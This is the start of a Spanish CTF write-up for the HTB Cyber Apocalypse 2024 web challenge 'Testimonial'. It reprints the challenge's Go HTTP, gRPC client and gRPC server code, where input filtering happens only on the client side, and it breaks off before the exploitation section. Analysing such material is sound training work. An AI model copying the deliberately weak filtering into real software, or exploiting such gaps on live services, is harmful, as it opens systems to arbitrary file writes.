<!doctype html><html lang="es"><head><title>Testimonial | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="HTB CA 2024. Go. gRPC. Verificación en el lado cliente. Navegación de directorios. Escritura de archivos arbitrarios. _Server-side Rendering_"><meta name="image" content="https://7rocky.github.io/images/web.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="HTB CA 2024. Go. gRPC. Verificación en el lado cliente. Navegación de directorios. Escritura de archivos arbitrarios. _Server-side Rendering_"><meta itemprop="keywords" content><meta itemprop="name" content="Testimonial"><meta property="article:published_time" content><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="HTB CA 2024. Go. gRPC. Verificación en el lado cliente. Navegación de directorios. Escritura de archivos arbitrarios. _Server-side Rendering_"><meta property="og:image" content="https://7rocky.github.io/images/web.png"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="Testimonial"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/testimonial/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="HTB CA 2024. Go. gRPC. Verificación en el lado cliente. Navegación de directorios. Escritura de archivos arbitrarios. _Server-side Rendering_"><meta name="twitter:description" content="HTB CA 2024. Go. gRPC. Verificación en el lado cliente. Navegación de directorios. Escritura de archivos arbitrarios. _Server-side Rendering_"><meta name="twitter:image" content="https://7rocky.github.io/images/web.png"><meta name="twitter:title" content="Testimonial"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/testimonial/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/other/htb-cyber-apocalypse/testimonial/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB CYBER APOCALYPSE</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/testimonial/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/testimonial/&amp;text=Testimonial" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/testimonial/&amp;title=Testimonial" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Testimonial</h1><p class="mb4 f6 dib tracked">6 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#análisis-del-código-fuente">Análisis del código fuente</a></li><li><a href="#explotación">Explotación</a><ul><li><a href="#escritura-de-archivos-arbitrarios">Escritura de archivos arbitrarios</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona el siguiente sitio web:</p><p><img alt="Testimonial 1" src="/images/other/HTB%20Cyber%20Apocalypse%202024/Testimonial-1.webp"></p><p>Además, tenemos un <em>endpoint</em> de gRPC en <code>94.237.49.166:58578</code>.</p><p>También se nos proporciona el código fuente del proyecto en Go.</p><h2 id="análisis-del-código-fuente">Análisis del código fuente</h2><p>Este es el archivo principal (<code>main.go</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">package</span><span class="mtk1"> </span><span class="mtk8 mtku">main</span>

<span class="mtk5">import</span><span class="mtk1"> (</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">embed</span><span class="mtk4">"</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">htbchal/handler</span><span class="mtk4">"</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">htbchal/pb</span><span class="mtk4">"</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">log</span><span class="mtk4">"</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">net</span><span class="mtk4">"</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">net/http</span><span class="mtk4">"</span>

<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">github.com/go-chi/chi/v5</span><span class="mtk4">"</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">google.golang.org/grpc</span><span class="mtk4">"</span>
<span class="mtk1">)</span>

<span class="mtk3">//go:embed public</span>
<span class="mtk5">var</span><span class="mtk1"> FS </span><span class="mtk8 mtku">embed</span><span class="mtk1">.</span><span class="mtk8 mtku">FS</span>

<span class="mtk5">func</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
<span class="mtk1">        router </span><span class="mtk5">:=</span><span class="mtk1"> chi.</span><span class="mtk8">NewMux</span><span class="mtk1">()</span>

<span class="mtk1">        router.</span><span class="mtk8">Handle</span><span class="mtk1">(</span><span class="mtk4">"/*"</span><span class="mtk1">, http.</span><span class="mtk8">StripPrefix</span><span class="mtk1">(</span><span class="mtk4">"/"</span><span class="mtk1">, http.</span><span class="mtk8">FileServer</span><span class="mtk1">(http.</span><span class="mtk8">FS</span><span class="mtk1">(FS))))</span>  
<span class="mtk1">        router.</span><span class="mtk8">Get</span><span class="mtk1">(</span><span class="mtk4">"/"</span><span class="mtk1">, handler.</span><span class="mtk8">MakeHandler</span><span class="mtk1">(handler.HandleHomeIndex))</span>
<span class="mtk1">        </span><span class="mtk5">go</span><span class="mtk1"> </span><span class="mtk8">startGRPC</span><span class="mtk1">()</span>
<span class="mtk1">        log.</span><span class="mtk8">Fatal</span><span class="mtk1">(http.</span><span class="mtk8">ListenAndServe</span><span class="mtk1">(</span><span class="mtk4">":1337"</span><span class="mtk1">, router))</span>
<span class="mtk1">}</span>

<span class="mtk5">type</span><span class="mtk1"> </span><span class="mtk8 mtku">server</span><span class="mtk1"> </span><span class="mtk5">struct</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk8 mtku">pb</span><span class="mtk1">.</span><span class="mtk8 mtku">RickyServiceServer</span>
<span class="mtk1">}</span>

<span class="mtk5">func</span><span class="mtk1"> </span><span class="mtk8">startGRPC</span><span class="mtk1">() </span><span class="mtk7 mtki">error</span><span class="mtk1"> {</span>
<span class="mtk1">        lis, err </span><span class="mtk5">:=</span><span class="mtk1"> net.</span><span class="mtk8">Listen</span><span class="mtk1">(</span><span class="mtk4">"tcp"</span><span class="mtk1">, </span><span class="mtk4">":50045"</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> err </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">nil</span><span class="mtk1"> {</span>
<span class="mtk1">                log.</span><span class="mtk8">Fatal</span><span class="mtk1">(err)</span>
<span class="mtk1">        }</span>
<span class="mtk1">        s </span><span class="mtk5">:=</span><span class="mtk1"> grpc.</span><span class="mtk8">NewServer</span><span class="mtk1">()</span>

<span class="mtk1">        pb.</span><span class="mtk8">RegisterRickyServiceServer</span><span class="mtk1">(s, </span><span class="mtk5">&amp;</span><span class="mtk8 mtku">server</span><span class="mtk1">{})</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> err </span><span class="mtk5">:=</span><span class="mtk1"> s.</span><span class="mtk8">Serve</span><span class="mtk1">(lis); err </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">nil</span><span class="mtk1"> {</span>
<span class="mtk1">                log.</span><span class="mtk8">Fatal</span><span class="mtk1">(err)</span>
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">nil</span>
<span class="mtk1">}</span>
</code></pre></div><p>Como se puede ver, utiliza un controlador para administrar las peticiones HTTP (<code>handler/home.go</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">package</span><span class="mtk1"> </span><span class="mtk8 mtku">handler</span>

<span class="mtk5">import</span><span class="mtk1"> (</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">htbchal/client</span><span class="mtk4">"</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">htbchal/view/home</span><span class="mtk4">"</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">net/http</span><span class="mtk4">"</span>
<span class="mtk1">)</span>

<span class="mtk5">func</span><span class="mtk1"> </span><span class="mtk8">HandleHomeIndex</span><span class="mtk1">(</span><span class="mtk9 mtki">w</span><span class="mtk1"> </span><span class="mtk8 mtku">http</span><span class="mtk1">.</span><span class="mtk8 mtku">ResponseWriter</span><span class="mtk1">, </span><span class="mtk9 mtki">r</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk8 mtku">http</span><span class="mtk1">.</span><span class="mtk8 mtku">Request</span><span class="mtk1">) </span><span class="mtk7 mtki">error</span><span class="mtk1"> {</span>
<span class="mtk1">        customer </span><span class="mtk5">:=</span><span class="mtk1"> r.URL.</span><span class="mtk8">Query</span><span class="mtk1">().</span><span class="mtk8">Get</span><span class="mtk1">(</span><span class="mtk4">"customer"</span><span class="mtk1">)</span>
<span class="mtk1">        testimonial </span><span class="mtk5">:=</span><span class="mtk1"> r.URL.</span><span class="mtk8">Query</span><span class="mtk1">().</span><span class="mtk8">Get</span><span class="mtk1">(</span><span class="mtk4">"testimonial"</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> customer </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk4">""</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> testimonial </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk4">""</span><span class="mtk1"> {</span>
<span class="mtk1">                c, err </span><span class="mtk5">:=</span><span class="mtk1"> client.</span><span class="mtk8">GetClient</span><span class="mtk1">()</span>
<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> err </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">nil</span><span class="mtk1"> {</span>
<span class="mtk1">                        http.</span><span class="mtk8">Error</span><span class="mtk1">(w, err.</span><span class="mtk8">Error</span><span class="mtk1">(), http.StatusInternalServerError)</span>  

<span class="mtk1">                }</span>

<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> err </span><span class="mtk5">:=</span><span class="mtk1"> c.</span><span class="mtk8">SendTestimonial</span><span class="mtk1">(customer, testimonial); err </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">nil</span><span class="mtk1"> {</span>
<span class="mtk1">                        http.</span><span class="mtk8">Error</span><span class="mtk1">(w, err.</span><span class="mtk8">Error</span><span class="mtk1">(), http.StatusInternalServerError)</span>

<span class="mtk1">                }</span>
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> home.</span><span class="mtk8">Index</span><span class="mtk1">().</span><span class="mtk8">Render</span><span class="mtk1">(r.</span><span class="mtk8">Context</span><span class="mtk1">(), w)</span>
<span class="mtk1">}</span>
</code></pre></div><p>Este <em>endpoint</em> usa una función <code>SendTestimonial</code> de un cliente de gRPC (<code>client/client.go</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">package</span><span class="mtk1"> </span><span class="mtk8 mtku">client</span>

<span class="mtk5">import</span><span class="mtk1"> (</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">context</span><span class="mtk4">"</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">fmt</span><span class="mtk4">"</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">htbchal/pb</span><span class="mtk4">"</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">strings</span><span class="mtk4">"</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">sync</span><span class="mtk4">"</span>

<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">google.golang.org/grpc</span><span class="mtk4">"</span>
<span class="mtk1">)</span>

<span class="mtk5">var</span><span class="mtk1"> (</span>
<span class="mtk1">        grpcClient </span><span class="mtk5">*</span><span class="mtk8 mtku">Client</span>
<span class="mtk1">        mutex      </span><span class="mtk5">*</span><span class="mtk8 mtku">sync</span><span class="mtk1">.</span><span class="mtk8 mtku">Mutex</span>
<span class="mtk1">)</span>

<span class="mtk5">func</span><span class="mtk1"> </span><span class="mtk8">init</span><span class="mtk1">() {</span>
<span class="mtk1">        grpcClient </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">nil</span>
<span class="mtk1">        mutex </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk8 mtku">sync</span><span class="mtk1">.</span><span class="mtk8 mtku">Mutex</span><span class="mtk1">{}</span>
<span class="mtk1">}</span>

<span class="mtk5">type</span><span class="mtk1"> </span><span class="mtk8 mtku">Client</span><span class="mtk1"> </span><span class="mtk5">struct</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk8 mtku">pb</span><span class="mtk1">.</span><span class="mtk8 mtku">RickyServiceClient</span>
<span class="mtk1">}</span>

<span class="mtk5">func</span><span class="mtk1"> </span><span class="mtk8">GetClient</span><span class="mtk1">() (</span><span class="mtk5">*</span><span class="mtk8 mtku">Client</span><span class="mtk1">, </span><span class="mtk7 mtki">error</span><span class="mtk1">) {</span>
<span class="mtk1">        mutex.</span><span class="mtk8">Lock</span><span class="mtk1">()</span>
<span class="mtk1">        </span><span class="mtk5">defer</span><span class="mtk1"> mutex.</span><span class="mtk8">Unlock</span><span class="mtk1">()</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> grpcClient </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">nil</span><span class="mtk1"> {</span>
<span class="mtk1">                conn, err </span><span class="mtk5">:=</span><span class="mtk1"> grpc.</span><span class="mtk8">Dial</span><span class="mtk1">(fmt.</span><span class="mtk8">Sprintf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk4 detected-link">127.0.0.1</span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk4">":50045"</span><span class="mtk1">), </span><span class="mtk1 squiggly-inline-deprecated">grpc.</span><span class="mtk8 squiggly-inline-deprecated">WithInsecure</span><span class="mtk1">())</span>
<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> err </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">nil</span><span class="mtk1"> {</span>
<span class="mtk1">                        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">nil</span><span class="mtk1">, err</span>
<span class="mtk1">                }</span>

<span class="mtk1">                grpcClient </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk8 mtku">Client</span><span class="mtk1">{pb.</span><span class="mtk8">NewRickyServiceClient</span><span class="mtk1">(conn)}</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> grpcClient, </span><span class="mtk6">nil</span>
<span class="mtk1">}</span>

<span class="mtk5">func</span><span class="mtk1"> (</span><span class="mtk9 mtki">c </span><span class="mtk5">*</span><span class="mtk8 mtku">Client</span><span class="mtk1">) </span><span class="mtk8">SendTestimonial</span><span class="mtk1">(</span><span class="mtk9 mtki">customer</span><span class="mtk1">, </span><span class="mtk9 mtki">testimonial</span><span class="mtk1"> </span><span class="mtk7 mtki">string</span><span class="mtk1">) </span><span class="mtk7 mtki">error</span><span class="mtk1"> {</span>
<span class="mtk1">        ctx </span><span class="mtk5">:=</span><span class="mtk1"> context.</span><span class="mtk8">Background</span><span class="mtk1">()</span>
<span class="mtk1">        </span><span class="mtk3">// Filter bad characters.</span>
<span class="mtk1">        </span><span class="mtk5">for</span><span class="mtk1"> _, char </span><span class="mtk5">:=</span><span class="mtk1"> </span><span class="mtk5">range</span><span class="mtk1"> []</span><span class="mtk7 mtki">string</span><span class="mtk1">{</span><span class="mtk4">"/"</span><span class="mtk1">, </span><span class="mtk4">"</span><span class="mtk6">\\</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk4">":"</span><span class="mtk1">, </span><span class="mtk4">"*"</span><span class="mtk1">, </span><span class="mtk4">"?"</span><span class="mtk1">, </span><span class="mtk4">"</span><span class="mtk6">\"</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk4">"&lt;"</span><span class="mtk1">, </span><span class="mtk4">"&gt;"</span><span class="mtk1">, </span><span class="mtk4">"|"</span><span class="mtk1">, </span><span class="mtk4">"."</span><span class="mtk1">} {</span>
<span class="mtk1">                customer </span><span class="mtk5">=</span><span class="mtk1"> strings.</span><span class="mtk8">ReplaceAll</span><span class="mtk1">(customer, char, </span><span class="mtk4">""</span><span class="mtk1">)</span>
<span class="mtk1">        }</span>

<span class="mtk1">        _, err </span><span class="mtk5">:=</span><span class="mtk1"> c.</span><span class="mtk8">SubmitTestimonial</span><span class="mtk1">(ctx, </span><span class="mtk5">&amp;</span><span class="mtk8 mtku">pb</span><span class="mtk1">.</span><span class="mtk8 mtku">TestimonialSubmission</span><span class="mtk1">{Customer: customer, Testimonial: testimonial})</span>  
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> err</span>
<span class="mtk1">}</span>
</code></pre></div><p>Y este cliente se conecta al <em>endpoint</em> del servidor gRPC, que se gestiona con <code>grpc.go</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">package</span><span class="mtk1"> </span><span class="mtk8 mtku">main</span>

<span class="mtk5">import</span><span class="mtk1"> (</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">context</span><span class="mtk4">"</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">errors</span><span class="mtk4">"</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">fmt</span><span class="mtk4">"</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">htbchal/pb</span><span class="mtk4">"</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">os</span><span class="mtk4">"</span>
<span class="mtk1">)</span>

<span class="mtk5">func</span><span class="mtk1"> (</span><span class="mtk9 mtki">s </span><span class="mtk5">*</span><span class="mtk8 mtku">server</span><span class="mtk1">) </span><span class="mtk8">SubmitTestimonial</span><span class="mtk1">(</span><span class="mtk9 mtki">ctx</span><span class="mtk1"> </span><span class="mtk8 mtku">context</span><span class="mtk1">.</span><span class="mtk8 mtku">Context</span><span class="mtk1">, </span><span class="mtk9 mtki">req</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk8 mtku">pb</span><span class="mtk1">.</span><span class="mtk8 mtku">TestimonialSubmission</span><span class="mtk1">) (</span><span class="mtk5">*</span><span class="mtk8 mtku">pb</span><span class="mtk1">.</span><span class="mtk8 mtku">GenericReply</span><span class="mtk1">, </span><span class="mtk7 mtki">error</span><span class="mtk1">) {</span>  
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> req.Customer </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">""</span><span class="mtk1"> {</span>
